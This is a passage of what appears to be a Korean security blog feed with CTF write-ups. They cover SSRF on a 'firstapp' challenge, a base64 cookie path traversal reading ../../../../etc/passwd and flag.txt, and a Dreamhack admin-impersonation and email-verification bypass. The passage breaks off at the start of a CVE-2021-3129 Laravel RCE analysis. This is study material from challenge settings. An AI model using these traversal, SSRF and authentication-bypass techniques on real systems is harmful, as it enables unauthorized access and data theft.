class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# dirb http:&#x2F;&#x2F;45.134.3.200:3000&#x2F; ~&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Jan 31 08:17:05 2021</span><br><span class="line">URL_BASE: http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;</span><br><span class="line">WORDLIST_FILES: &#x2F;root&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;45.134.3.200:3000&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;css (CODE:301|SIZE:173)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;get_file (CODE:200|SIZE:18)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;images (CODE:301|SIZE:179)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;login (CODE:200|SIZE:5661)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;Login (CODE:200|SIZE:5661)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;logout (CODE:302|SIZE:28)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;profile (CODE:200|SIZE:24)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Jan 31 08:33:29 2021</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 7</span><br><span class="line">root@py:~#</span><br></pre></td></tr></table></figure><p>dirb 툴을 돌려보니 <code>/get_file</code>이 존재하는 것을 알 수 있었고, 혹시나 <code>/get_url</code>도 있나 해보니 <code>/get_url</code>도 있었습니다. 이로서 우리는 2개의 벡터를 더 찾았습니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/3.png?raw=true"></p><p>제일 먼저 <code>/get_file</code>에서 시도해보았습니다. 일단 파라미터를 알지 못 하지만 file이라는 파라미타를 사용하고 있을 거 같다는 생각을 할 수 있습니다. 그래서 file 파라미터로 flag, flag.txt, flag.py, flag.php 등 등을 읽어 보려 했지만 어떤 값이 들어와도 <code>SRSLY ???</code>라는 문자열만 출력이 되었습니다.<br></p><p>하지만 아까 게싱을 해서 <code>/get_url</code>이 존재한다는 것을 알아냈습니다. 그래서 SSRF를 이용해서 FLAG가 들어있는 파일을 긁어 오기로 했습니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/4.png?raw=true"></p><p><code>/get_url</code>에서 일단 url이라는 파라미터로 SSRF를 시도해보니 <code>not logged in</code>이 뜨는 것을 볼 수 있습니다. 분명 로그인을 했는 데, <code>not logged in</code>이 뜨는 이유는 내부 서버로 잘 접근을 했다는 것 입니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/5.png?raw=true"></p><p>그래서 SSRF를 이용해서 flag.* 파일을 모두 읽어 보니 flag.txt 파일이 존재하는 것을 알 수 있었고, 해당 파일 내용으로 FLAG가 있는 것을 볼 수 있습니다.<br></p><blockquote><p>FLAG : flag{h0p3_y0u_l1ked_my_@pp5613}</p></blockquote><hr><h2 id="Web-waffed-496-pts"><a href="#Web-waffed-496-pts" class="headerlink" title=" (Web) waffed [496 pts]"></a><span style="color:#21C587"></span> (Web) waffed [496 pts]</h2><blockquote><p>waffed 문제는 Cookie 변조와 LFI 취약점을 이용해서 flag를 가져오는 문제입니다.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/1.png?raw=true"></p><p>문제로 들어오면 <code>waffed</code> 사이트가 뜨는 것을 볼 수 있습니다. 해당 사이트는 각 코인마다 퍼센트지를 보여지는 사이트입니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/2.png?raw=true"></p><p><code>LEARN MORE</code> 버튼을 눌러보면 현재 선택한 코인의 퍼센트지를 그래프를 보여주고 있는 것을 볼 수 있고, 현재 코인 이름은 <code>price_feed</code> 쿠키에 저장이 되어 있습니다. 그리고 다른 코인의 그래프를 볼 수 있게 설정하는 기능도 있습니다. 그럼 한 번 다른 코인으로 바꾸는 요청을 잡고, 헤더를 확인해보겠습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">GET &#x2F;changeFeed&#x2F;DAI HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:9090</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 302 FOUND</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 13:19:56 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 219</span><br><span class="line">Location: http:&#x2F;&#x2F;207.180.200.166:9090&#x2F;trade</span><br><span class="line">Connection: close</span><br><span class="line">Set-Cookie: price_feed&#x3D;REFJ; Path&#x3D;&#x2F;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 3.2 Final&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;title&gt;Redirecting...&lt;&#x2F;title&gt;</span><br><span class="line">&lt;h1&gt;Redirecting...&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;You should be redirected automatically to target URL: &lt;a href&#x3D;&quot;&#x2F;trade&quot;&gt;&#x2F;trade&lt;&#x2F;a&gt;.  If not click the link.</span><br></pre></td></tr></table></figure><p>헤더를 보면 요청을 하면 <code>DAI</code>라는 코인으로 바꾸고, 바로 그래프가 있는 곳으로 리다이렉션 시켜주는 것을 볼 수 있습니다. 여기서 중요한 부분은 응답에 <code>Set-Cookie</code> 헤더를 보면 <code>price_feed</code>의 값으로 <code>REFJ</code>가 들어있는 것을 볼 수 있습니다. <code>REFJ</code>는 우리가 바꾼 코인의 이름(DAI)이 b64로 인코딩되어 들어간 것 입니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/3.png?raw=true"></p><p>즉, 서버에서는 b64로 해당 쿠키 값을 디코딩해서 사용한다는 것 입니다. 그래서 일단 SQL Injection을 시도해보기 위해서 페이로드를 b64 인코딩을 해줘서 보내주니 <code>WOOPS</code>만 뜨고 아무 일도 일어나지 않았습니다.<br></p><p>하지만 여기서 <code>price_feed</code> 값으로 코인 이름을 바꿔서 코인에 대한 파일을 조회하는 거라면?이라고 생각을 했습니다. 그 이유는 코인마다 그래프도 다 다르기 때문에 모든 데이터를 각 코인의 파일로 관리하고 있을 거라는 생각이 들었습니다. 그래서 바로 LFI를 진행했고, 일단 <code>/etc/passwd</code>를 긁어오기를 시도했습니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/3.png?raw=true"></p><p>그래서 <code>/etc/passwd</code>를 b64로 인코딩해서 쿠키 값으로 설정하고, 새로 고침을 해주니 SQL Injection과 마찬가지로 <code>WOOPS</code>라고 뜨는 것을 볼 수 있습니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/4.png?raw=true"></p><p>하지만 현재 경로에서 해당 파일이 없어 <code>WOOPS</code>가 출력되는 걸 수도 있기 때문에 상위로 한 번 한 번 올라가며 모두 시도 해보았는데, 총 4번 올라가서 <code>../../../../etc/passwd</code>를 읽어보니 <code>WOOPS</code>가 뜨지 않고, 그래프가 있는 창으로 리다이렉션이 되었습니다. 그런데 이상한 점은 그래프는 있는데 그래프에 데이터가 존재하지 않았습니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/5.png?raw=true"></p><p>그래서 그래프의 소스 코드를 확인해보니 그래프를 만드는 JS 코드가 있었고, 그래프의 data 값으로 <code>/etc/passwd</code>의 값이 들어가 있는 것을 볼 수 있었습니다. 예상대로 각 코인의 데이터를 파일로 관리하고 있었습니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/6.png?raw=true"></p><p>앞에 모든 문제도 FLAG는 <code>flag.txt</code>에 있었기 때문에 이번 문제도 상위로 4번 올라가 <code>../../../../flag.txt</code>를 읽어주니 그래프의 data에 FLAG가 있는 것을 볼 수 있었습니다.<br></p><blockquote><p>flag{w@fs_r3@lly_d0_Suck8245}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> XXE </tag>
            
            <tag> LFI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dreamhack CTF Season 1 Round #4 Write Up</title>
      <link href="2021/01/30/2021-01-30-dctf/"/>
      <url>2021/01/30/2021-01-30-dctf/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/Dreamhack%20CTF%20%234/dctf10th.png?raw=true"></p><p>2021년 1월 30일 오전 9시부터 오후 6시까지 Theory에서 CTF를 주최하였습니다. 이번 대회는 전체적으로 난이도가 낮아 운이 좋게 10등을 할 수 있었고, 풀면서 그나마 공을 들였던 <code>WEB_2021A_Medium</code>라는 문제의 Write Up을 작성해보겠습니다.<br></p><h2 id="Web-WEB-2021A-Medium-936-pts"><a href="#Web-WEB-2021A-Medium-936-pts" class="headerlink" title="(Web) WEB_2021A_Medium [936 pts]"></a>(Web) WEB_2021A_Medium [936 pts]</h2><blockquote><p>WEB_2021A_Medium 문제는 관리자 계정으로 로그인하고, 관리자 계정을 활성화 한 후에 FLAG를 읽는 문제입니다.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>)</span><br><span class="line">    myusr = User.query.filter_by(userid=get_userid()).first()</span><br><span class="line">    <span class="keyword">if</span> myusr.userid == <span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> myusr.auth:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;flag.html&quot;</span>, flag=FLAG)</span><br><span class="line">    <span class="keyword">return</span> alert(<span class="string">&quot;No Flag&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>/flag</code>를 보면 현재 로그인된 사용자가 <code>admin</code>이고, 계정이 활성화가 되어 있으면 <code>FLAG</code>를 보여주는 것을 볼 수 있습니다. 그럼 관리자 계정을 획득하고, 계정을 활성화 시켜보겠습니다.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    userid = db.Column(db.String(<span class="number">80</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    password = db.Column(db.String(<span class="number">80</span>))</span><br><span class="line">    email = db.Column(db.String(<span class="number">80</span>))</span><br><span class="line">    auth = db.Column(db.Boolean())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, userid, password, email</span>):</span></span><br><span class="line">        self.userid = userid</span><br><span class="line">        self.password = password</span><br><span class="line">        self.email = email</span><br><span class="line">        self.auth = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_json</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;userid&quot;</span>: self.userid.lower(),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: self.password.lower(),</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: self.email.lower(),</span><br><span class="line">            <span class="string">&quot;auth&quot;</span>: self.auth,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/signin&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin</span>():</span></span><br><span class="line">    <span class="keyword">if</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;Already Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;signin.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        userid = request.form.get(<span class="string">&quot;userid&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        userpw = request.form.get(<span class="string">&quot;userpw&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        usr = User.query.filter_by(</span><br><span class="line">            userid=userid, password=hashlib.md5(userpw.encode()).hexdigest()</span><br><span class="line">        ).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(usr, <span class="string">&quot;userid&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Check userid or userpw&quot;</span>)</span><br><span class="line">        session[<span class="string">&quot;info&quot;</span>] = usr.to_json()</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p>로그인 로직을 보면 userid, userpw 값을 받아와서 로그인하는 것을 볼 수 있습니다. 여기서 session을 관리 할 때 to_json 함수를 이용해서 사용자 정보를 넣어주는 것을 볼 수 있습니다. to_json 함수를 보면 userid의 값을 lower 함수를 이용해 소문자로 만들어 세션으로 사용하는 것을 볼 수 있습니다. 즉, <code>ADMIN</code>이라는 사용자를 가입해서 로그인을 해주면 to_json 함수에 의해서 <code>admin</code>으로 로그인이 됩니다. 이를 통해 관리자 아이디는 쉽게 획득했습니다.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Auth</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, email</span>):</span></span><br><span class="line">        self.email = email</span><br><span class="line">        self.emailauth_key = <span class="string">f&quot;auth:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line">        self.getcount_key = <span class="string">f&quot;auth_count:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">self</span>):</span></span><br><span class="line">        setcount = conn.get(self.email)</span><br><span class="line">        <span class="keyword">if</span> setcount:</span><br><span class="line">            setcount = <span class="built_in">int</span>(setcount) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            setcount = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> setcount &lt; <span class="number">5</span>:</span><br><span class="line">            self.random_key = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">111111</span>, <span class="number">999999</span>):04d&#125;</span>&quot;</span></span><br><span class="line">            conn.<span class="built_in">set</span>(self.emailauth_key, self.random_key)</span><br><span class="line">            conn.<span class="built_in">set</span>(self.getcount_key, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">            conn.<span class="built_in">set</span>(self.email, setcount)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        getcount = conn.get(self.getcount_key)</span><br><span class="line">        <span class="keyword">if</span> getcount:</span><br><span class="line">            getcount = <span class="built_in">int</span>(getcount) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            getcount = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> getcount &lt; <span class="number">5</span>:</span><br><span class="line">            conn.<span class="built_in">set</span>(self.getcount_key, getcount)</span><br><span class="line">            <span class="keyword">return</span> conn.get(self.emailauth_key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/email_verify&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">email_verify</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    email = get_useremail()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;email_verify.html&quot;</span>, email=email)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        auth = Auth(email)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> auth.<span class="built_in">set</span>():</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Too many Auth&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> send_mail(email, auth.random_key):</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">f&quot;Send Email To <span class="subst">&#123;email&#125;</span>&quot;</span>, <span class="string">&quot;/email_verify_chk&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Send Email Err&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/email_verify_chk&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">email_verify_chk</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    email = get_useremail()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;email_verify_chk.html&quot;</span>, email=email)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        auth = Auth(email)</span><br><span class="line">        authcode = auth.get()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> authcode:</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Too many Auth or No Code Generated&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = request.form.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> code == authcode:</span><br><span class="line">                usr = User.query.filter_by(userid=get_userid()).first()</span><br><span class="line">                usr.auth = <span class="literal">True</span></span><br><span class="line">                db.session.commit()</span><br><span class="line">                session[<span class="string">&quot;info&quot;</span>] = usr.to_json()</span><br><span class="line">                <span class="keyword">return</span> alert(<span class="string">&quot;AUTH!&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> alert(<span class="string">&quot;Check Code&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>/email_verify</code>는 보면 현재 사용자의 이메일로 인증 번호를 생성하는 로직입니다. 코드를 보면 현재 사용자의 이메일을 Auth 클래스의 인자로 넘겨주며 클래스를 생성하고, set 함수를 이용해서 인증 코드를 생성해서 디비에 저장하고 있는 것을 볼 수 있습니다.<br></p><p><code>/email_verify_chk</code>는 인증 번호를 입력 받고, 디비에 저장되어 있는 값과 비교해서 참이면 활성화를 해주고, 거짓이면 그대로 비활성화로 있습니다.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.email = email</span><br><span class="line">self.emailauth_key = <span class="string">f&quot;auth:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line">self.getcount_key = <span class="string">f&quot;auth_count:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">conn.<span class="built_in">set</span>(self.emailauth_key, self.random_key)</span><br><span class="line">conn.<span class="built_in">set</span>(self.getcount_key, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">conn.<span class="built_in">set</span>(self.email, setcount)</span><br></pre></td></tr></table></figure><p>위 코드를 보면 email 값을 이용해서 email, emailauth_key, getcount_key 값을 만들고, 이를 redis의 키로 사용하는 것을 볼 수 있습니다. 그리고 emailauth_key가 실제로 입력 받은 인증 번호와 비교를 하는 값 입니다. 하지만 우리는 이 값을 알아낼 수는 없지만 로직을 이해하고 있다면 쉽게 우회할 수 있습니다. 해당 로직에 대한 내용은 <a href="https://dreamhack.io/learn/29#t209">드림핵 강의</a>에서 자세하게 다루고 있습니다. 이번 로직은 설명하기 귀찮고, 그냥 글을 보는 게 좋을 거 같습니다.<br></p><ul><li>시나리오<br></li></ul><ol><li><code>ADMIN</code>으로 회원 가입을 하고, <code>ADMIN</code>으로 로그인을 해서 관리자로 로그인을 한다.</li><li><code>auth:admin</code>인 사용자를 하나 더 만들어서 로그인을 한 후에, 인증 코드를 받는다.</li><li>(2)번 시나리오에서의 로직 때문에 관리자가 <code>/email_verify_chk</code>에서 <code>입력 받은</code> 인증 코드와 비교되는 인증 코드가 1로 바뀐다.</li><li>관리자에서 인증 코드를 1을 보내주면 관리자 게정이 활성화된다. </li><li>이제 FLAG를 읽으면 된다.<br></li></ol><p>위 내용은 그냥 링크 달아준 드림핵 강의를 한 번 보면 이해가 가실 겁니다.<br></p><blockquote><p>FLAG : DH{3cd6941075580d889519fcf1bd422bd1}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REDIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3129 RCE in Laravel Debug mode</title>
      <link href="2021/01/25/2021-01-25-CVE-2021-3129/"/>
      <url>2021/01/25/2021-01-25-CVE-2021-3129/</url>
      
        <content type="html"><![CDATA[<p>Laravel Debug mode에서 발견된 CVE-2021-3129 취약점을 분석해보겠습니다. Laravel은 자유/오픈 소스 PHP 웹 프레임워크 중 하나라고 합니다. 해당 취약점은 보안 연구원이 Laravel을 기반으로 한 웹 사이트에서 취약점 진단을 하다가 디버그 모드에서 발견했다고 합니다. 해당 사이트는 전체적으로 안전했지만 웹 프레임워크 취약점을 이용해서 RCE를 트리거 했습니다.<br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2021-3129</td><td>laravel &lt;= 8.4.2 and Ignition &lt;= 2.5.1</td><td>9.8</td></tr></tbody></table><p><br>CVE-2021-3129는 Laravel의 &lt;= V8.4.2 DEBUG MODE에서 모두 발생한다고 합니다. 2020년 11월 16일에 POC를 전달해주었고, 바로 다음 날 패치 버전을 발표했다고 합니다.<br></p><hr><h2 id="CVE-2021-3129"><a href="#CVE-2021-3129" class="headerlink" title="CVE-2021-3129"></a><em>CVE-2021-3129</em></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 141.164.52.207:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;141.164.52.207:8888&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: 